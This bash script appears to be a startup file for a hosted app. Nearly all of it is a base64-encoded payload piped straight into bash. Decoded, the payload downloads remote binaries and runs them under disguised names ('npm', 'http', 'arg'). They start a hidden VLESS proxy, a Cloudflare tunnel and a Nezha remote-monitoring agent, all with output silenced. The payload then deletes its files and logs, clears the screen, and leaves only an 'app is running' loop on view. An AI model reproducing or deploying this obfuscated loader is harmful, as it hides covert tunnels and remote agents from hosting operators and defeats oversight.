#!/bin/bash
export UUID=${UUID:-''}
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_KEY=${NEZHA_KEY:-''}
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
export ARGO_AUTH=${ARGO_AUTH:-''}    
export CFIP=${CFIP:-''} 
export CFPORT=${CFPORT:-'443'}         
export NAME=${NAME:-'US-streamlit'}        
export FILE_PATH=${FILE_PATH:-'./tmp'}
export ARGO_PORT=${ARGO_PORT:-'8081'}

echo "YXJnb19jb25maWd1cmUoKSB7CiAgaWYgW1sgLXogJEFSR09fQVVUSCB8fCAteiAkQVJHT19ET01BSU4gXV07IHRoZW4KICAgIGVjaG8gLWUgIlxlWzE7MzJtQVJHT19ET01BSU4gb3IgQVJHT19BVVRIIHZhcmlhYmxlIGlzIGVtcHR5LCB1c2UgcXVpY2sgdHVubmVsc1xlWzBtIgogICAgcmV0dXJuCiAgZmkKCiAgaWYgW1sgJEFSR09fQVVUSCA9fiBUdW5uZWxTZWNyZXQgXV07IHRoZW4KICAgIGVjaG8gJEFSR09fQVVUSCA+ICR7RklMRV9QQVRIfS90dW5uZWwuanNvbgogICAgY2F0ID4gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwgPDwgRU9GCnR1bm5lbDogJChjdXQgLWRcIiAtZjEyIDw8PCAiJEFSR09fQVVUSCIpCmNyZWRlbnRpYWxzLWZpbGU6ICR7RklMRV9QQVRIfS90dW5uZWwuanNvbgpwcm90b2NvbDogaHR0cDIKCmluZ3Jlc3M6CiAgLSBob3N0bmFtZTogJEFSR09fRE9NQUlOCiAgICBzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQKICAgIG9yaWdpblJlcXVlc3Q6CiAgICAgIG5vVExTVmVyaWZ5OiB0cnVlIAogIC0gc2VydmljZTogaHR0cF9zdGF0dXM6NDA0CkVPRgogIGVsc2UKICAgIGVjaG8gLWUgIlxlWzE7MzJtQVJHT19BVVRIIG1pc21hdGNoIFR1bm5lbFNlY3JldCx1c2UgdG9rZW4gY29ubmVjdCB0byB0dW5uZWxcZVswbSIKICBmaQp9CmFyZ29fY29uZmlndXJlCndhaXQKCmdlbmVyYXRlX2NvbmZpZygpIHsKICBjYXQgPiAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPDwgRU9GCnsKICAibG9nIjogewogICAgImFjY2VzcyI6ICIvZGV2L251bGwiLAogICAgImVycm9yIjogIi9kZXYvbnVsbCIsCiAgICAibG9nbGV2ZWwiOiAid2FybmluZyIKICB9LAogICJpbmJvdW5kcyI6IFsKICAgIHsKICAgICAgInBvcnQiOiAkQVJHT19QT1JULAogICAgICAibGlzdGVuIjogIjo6IiwKICAgICAgInByb3RvY29sIjogInZsZXNzIiwKICAgICAgInNldHRpbmdzIjogewogICAgICAgICJjbGllbnRzIjogWwogICAgICAgICAgewogICAgICAgICAgICAiaWQiOiAiJHtVVUlEfSIKICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJkZWNyeXB0aW9uIjogIm5vbmUiCiAgICAgIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsKICAgICAgICAibmV0d29yayI6ICJ3cyIsCiAgICAgICAgIndzU2V0dGluZ3MiOiB7CiAgICAgICAgICAicGF0aCI6ICIvdmxlc3MiCiAgICAgICAgfQogICAgICB9CiAgICB9CiAgXSwKICAgIm91dGJvdW5kcyI6IFsKICAgICB7CiAgICAgICAidGFnIjogImRpcmVjdCIsCiAgICAgICAicHJvdG9jb2wiOiAiZnJlZWRvbSIKICAgICB9CiAgXQp9CkVPRgp9CmdlbmVyYXRlX2NvbmZpZwp3YWl0CgpBUkNIPSQodW5hbWUgLW0pICYmIERPV05MT0FEX0RJUj0iJHtGSUxFX1BBVEh9IiAmJiBta2RpciAtcCAiJERPV05MT0FEX0RJUiIgJiYgRklMRV9JTkZPPSgpCmlmIFsgIiRBUkNIIiA9PSAiYXJtIiBdIHx8IFsgIiRBUkNIIiA9PSAiYXJtNjQiIF0gfHwgWyAiJEFSQ0giID09ICJhYXJjaDY0IiBdOyB0aGVuCiAgICBGSUxFX0lORk89KCJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hcm02NC9ib3QxMyBhcmciICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hcm02NC94cmF5IGh0dHAiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9BUk0vc3dpdGggbnBtIikKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCiAgICBGSUxFX0lORk89KCJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9ib3QxMyBhcmciICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC94cmF5IGh0dHAiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9idWxpZC9zd2l0aCBucG0iKQplbHNlCiAgICBlY2hvICJVbnN1cHBvcnRlZCBhcmNoaXRlY3R1cmU6ICRBUkNIIgogICAgZXhpdCAxCmZpCmZvciBlbnRyeSBpbiAiJHtGSUxFX0lORk9bQF19IjsgZG8KICAgIFVSTD0kKGVjaG8gIiRlbnRyeSIgfCBjdXQgLWQgJyAnIC1mIDEpCiAgICBORVdfRklMRU5BTUU9JChlY2hvICIkZW50cnkiIHwgY3V0IC1kICcgJyAtZiAyKQogICAgRklMRU5BTUU9IiRET1dOTE9BRF9ESVIvJE5FV19GSUxFTkFNRSIKICAgIGlmIFsgLWUgIiRGSUxFTkFNRSIgXTsgdGhlbgogICAgICAgIGVjaG8gLWUgIlxlWzE7MzJtJEZJTEVOQU1FIGFscmVhZHkgZXhpc3RzLFNraXBwaW5nIGRvd25sb2FkXGVbMG0iCiAgICBlbHNlCiAgICAgICAgY3VybCAtTCAtc1MgLW8gIiRGSUxFTkFNRSIgIiRVUkwiCiAgICAgICAgZWNobyAtZSAiXGVbMTszMm1Eb3dubG9hZGluZyAkRklMRU5BTUVcZVswbSIKICAgIGZpCmRvbmUKd2FpdAoKcnVuKCkgewogIGlmIFsgLWUgIiR7RklMRV9QQVRIfS9ucG0iIF07IHRoZW4KICAgIGNobW9kIDc3NyAiJHtGSUxFX1BBVEh9L25wbSIKICAgIHRsc1BvcnRzPSgiNDQzIiAiODQ0MyIgIjIwOTYiICIyMDg3IiAiMjA4MyIgIjIwNTMiKQogICAgaWYgW1sgIiR7dGxzUG9ydHNbKl19IiA9fiAiJHtORVpIQV9QT1JUfSIgXV07IHRoZW4KICAgICAgTkVaSEFfVExTPSItLXRscyIKICAgIGVsc2UKICAgICAgTkVaSEFfVExTPSIiCiAgICBmaQogICAgaWYgWyAtbiAiJE5FWkhBX1NFUlZFUiIgXSAmJiBbIC1uICIkTkVaSEFfUE9SVCIgXSAmJiBbIC1uICIkTkVaSEFfS0VZIiBdOyB0aGVuCiAgICAgICAgbm9odXAgJHtGSUxFX1BBVEh9L25wbSAtcyAke05FWkhBX1NFUlZFUn06JHtORVpIQV9QT1JUfSAtcCAke05FWkhBX0tFWX0gJHtORVpIQV9UTFN9IC0tcmVwb3J0LWRlbGF5IDQgLS1za2lwLWNvbm4gLS1za2lwLXByb2NzID4vZGV2L251bGwgMj4mMSAmCgkJICAgIHNsZWVwIDIKICAgICAgICBwZ3JlcCAteCAibnBtIiA+IC9kZXYvbnVsbCAmJiBlY2hvIC1lICJcZVsxOzMybW5wbSBpcyBydW5uaW5nXGVbMG0iIHx8IHsgZWNobyAtZSAiXGVbMTszNW1ucG0gaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICJucG0iICYmIG5vaHVwICIke0ZJTEVfUEFUSH0vbnBtIiAtcyAke05FWkhBX1NFUlZFUn06JHtORVpIQV9QT1JUfSAtcCAke05FWkhBX0tFWX0gJHtORVpIQV9UTFN9IC0tcmVwb3J0LWRlbGF5IDQgLS1za2lwLWNvbm4gLS1za2lwLXByb2NzID4vZGV2L251bGwgMj4mMSAmIHNsZWVwIDI7IGVjaG8gLWUgIlxlWzE7MzJtbnBtIHJlc3RhcnRlZFxlWzBtIjsgfQogICAgZWxzZQogICAgICAgIGVjaG8gLWUgIlxlWzE7MzVtTkVaSEEgdmFyaWFibGUgaXMgZW1wdHksc2tpcGluZyBydW5pbmdcZVswbSIKICAgIGZpCiAgZmkKCiAgaWYgWyAtZSAiJHtGSUxFX1BBVEh9L2h0dHAiIF07IHRoZW4KICAgIGNobW9kIDc3NyAiJHtGSUxFX1BBVEh9L2h0dHAiCiAgICBub2h1cCAke0ZJTEVfUEFUSH0vaHR0cCAtYyAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPi9kZXYvbnVsbCAyPiYxICYKCSAgc2xlZXAgMgogICAgcGdyZXAgLXggImh0dHAiID4gL2Rldi9udWxsICYmIGVjaG8gLWUgIlxlWzE7MzJtaHR0cCBpcyBydW5uaW5nXGVbMG0iIHx8IHsgZWNobyAtZSAiXGVbMTszNW1odHRwIGlzIG5vdCBydW5uaW5nLCByZXN0YXJ0aW5nLi4uXGVbMG0iOyBwa2lsbCAteCAiaHR0cCIgJiYgbm9odXAgIiR7RklMRV9QQVRIfS9odHRwIiAtYyAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPi9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszMm1odHRwIHJlc3RhcnRlZFxlWzBtIjsgfQogIGZpCgogIGlmIFsgLWUgIiR7RklMRV9QQVRIfS9hcmciIF07IHRoZW4KICAgIGNobW9kIDc3NyAiJHtGSUxFX1BBVEh9L2FyZyIKICAgIGlmIFtbICRBUkdPX0FVVEggPX4gXltBLVowLTlhLXo9XXsxMjAsMjUwfSQgXV07IHRoZW4KICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgcnVuIC0tdG9rZW4gJHtBUkdPX0FVVEh9IgogICAgZWxpZiBbWyAkQVJHT19BVVRIID1+IFR1bm5lbFNlY3JldCBdXTsgdGhlbgogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCBydW4iCiAgICBlbHNlCiAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIC0tbG9nZmlsZSAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgLS1sb2dsZXZlbCBpbmZvIC0tdXJsIGh0dHA6Ly9sb2NhbGhvc3Q6JEFSR09fUE9SVCIKICAgIGZpCiAgICBub2h1cCAke0ZJTEVfUEFUSH0vYXJnICRhcmdzID4vZGV2L251bGwgMj4mMSAmCiAgICBzbGVlcCAyCiAgICBwZ3JlcCAteCAiYXJnIiA+IC9kZXYvbnVsbCAmJiBlY2hvIC1lICJcZVsxOzMybWFyZyBpcyBydW5uaW5nXGVbMG0iIHx8IHsgZWNobyAtZSAiXGVbMTszNW1hcmcgaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICJhcmciICYmIG5vaHVwICIke0ZJTEVfUEFUSH0vYXJnIiAkYXJncyA+L2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyOyBlY2hvIC1lICJcZVsxOzMybWFyZyByZXN0YXJ0ZWRcZVswbSI7IH0KICBmaQoKfSAKcnVuCnNsZWVwIDUKCmZ1bmN0aW9uIGdldF9hcmdvZG9tYWluKCkgewogIGlmIFtbIC1uICRBUkdPX0FVVEggXV07IHRoZW4KICAgIGVjaG8gIiRBUkdPX0RPTUFJTiIKICBlbHNlCiAgICBncmVwIC1vRSAnaHR0cHM6Ly9bWzphbG51bTpdK1wuLV0rXC50cnljbG91ZGZsYXJlXC5jb20nICIke0ZJTEVfUEFUSH0vYm9vdC5sb2ciIHwgc2VkICdzQGh0dHBzOi8vQEAnCiAgZmkKfQoKZ2VuZXJhdGVfbGlua3MoKSB7CiAgYXJnb2RvbWFpbj0kKGdldF9hcmdvZG9tYWluKQogIGVjaG8gLWUgIlxlWzE7MzJtQXJnb0RvbWFpbjpcZVsxOzM1bSR7YXJnb2RvbWFpbn1cZVswbSIKICBzbGVlcCAyCgogIGlzcD0kKGN1cmwgLXMgaHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS9tZXRhIHwgYXdrIC1GXCIgJ3twcmludCAkMjYiLSIkMTh9JyB8IHNlZCAtZSAncy8gL18vZycpCiAgc2xlZXAgMgoKICBjYXQgPiAke0ZJTEVfUEFUSH0vbGlzdC50eHQgPDxFT0YKdmxlc3M6Ly8ke1VVSUR9QCR7Q0ZJUH06JHtDRlBPUlR9P2VuY3J5cHRpb249bm9uZSZzZWN1cml0eT10bHMmdHlwZT13cyZob3N0PSR7YXJnb2RvbWFpbn0mcGF0aD0lMkZ2bGVzcz9lZD0yNTYwIyR7TkFNRX0KRU9GCgogIGNhdCAke0ZJTEVfUEFUSH0vbGlzdC50eHQKICBlY2hvIC1lICJcblxlWzE7MzJtJHtGSUxFX1BBVEh9L2xpc3QudHh0IHNhdmVkIHN1Y2Nlc3NmdWxseVxlWzBtIgogIHNsZWVwIDUgIAogIHJtIC1yZiAke0ZJTEVfUEFUSH0vbGlzdC50eHQgJHtGSUxFX1BBVEh9L2Jvb3QubG9nICR7RklMRV9QQVRIfS9jb25maWcuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwgJHtGSUxFX1BBVEh9L25wbSAke0ZJTEVfUEFUSH0vYXJnICR7RklMRV9QQVRIfS9odHRwCn0KZ2VuZXJhdGVfbGlua3MKZWNobyAtZSAiXGVbMTs5Nm1SdW5uaW5nIGRvbmUhXGVbMG0iCmVjaG8gLWUgIlxlWzE7OTZtVGhhbmsgeW91IGZvciB1c2luZyB0aGlzIHNjcmlwdCxlbmpveSFcZVswbSIKc2xlZXAgNjAKY2xlYXI=" | base64 -d | bash

while true; do

echo "app is running"

sleep 36000000000

done

